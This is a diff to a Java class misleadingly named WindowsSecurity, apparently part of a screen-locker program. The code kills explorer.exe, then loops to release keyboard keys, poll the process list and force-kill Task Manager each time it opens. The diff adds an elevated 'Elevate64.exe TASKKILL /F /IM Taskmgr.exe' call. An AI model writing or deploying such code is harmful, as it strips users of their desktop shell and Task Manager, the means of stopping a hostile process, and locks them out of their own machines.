@@ -12,6 +12,8 @@ package main;
 import java.awt.Robot;
 import java.awt.event.KeyAdapter;
 import java.awt.event.KeyEvent;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 import javax.swing.JFrame;
 import javax.swing.JPanel;
 
@@ -27,38 +29,44 @@ public class WindowsSecurity implements Runnable
     running=true;
     new Thread(this).start();
   }
-
-  public void stop()
-  {
-     this.running = false;
-  }
-
-  @Override
-  public void run() {
-    try {
+  
+     @Override
+    public void run() {
+        try {
      
       //this.terminal.getParentFrame().setDefaultCloseOperation(0);
       kill("explorer.exe"); // Kill explorer
       Robot robot = new Robot();
-      int i = 0;
       while (running) {
-         sleep(30L);
-         focus();
-         releaseKeys(robot);
-         sleep(15L);
-         focus();
-         if (i++ % 10 == 0) {
-             kill("taskmgr.exe");
-         }
-         focus();
-         releaseKeys(robot);
-         
-      }
-      
-      //Runtime.getRuntime().exec("explorer.exe"); // Restart explorer
-    } catch (Exception e) {
+       sleep(30L);
+       releaseKeys(robot);
+       sleep(15L);
+       String line;
+       String pidInfo ="";
 
+       Process p =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"tasklist.exe");
+       BufferedReader input =  new BufferedReader(new InputStreamReader(p.getInputStream()));
+
+       while ((line = input.readLine()) != null) {
+       pidInfo+=line; 
+}
+
+       input.close();
+
+       if(pidInfo.contains("Taskmgr.exe"))
+       {
+       kill("taskmgr.exe");
+       }
+       releaseKeys(robot);         
+      }
+    } catch (Exception e) {
+    System.out.println(e);
     }
+    }
+  
+  public void stop()
+  {
+     this.running = false;
   }
 
   private void releaseKeys(Robot robot) {
@@ -79,16 +87,12 @@ public class WindowsSecurity implements Runnable
 
   private void kill(String string) {
     try {
+        if(!string.equals("taskmgr.exe"))
       Runtime.getRuntime().exec("taskkill /F /IM " + string).waitFor();
+     else
+      Runtime.getRuntime().exec("src//Elevate64.exe TASKKILL /F /IM Taskmgr.exe").waitFor(); 
     } catch (Exception e) {
     }
-  }
-
-  private void focus() {
-      
-
-
-frame.requestFocus();
   }
 }
 
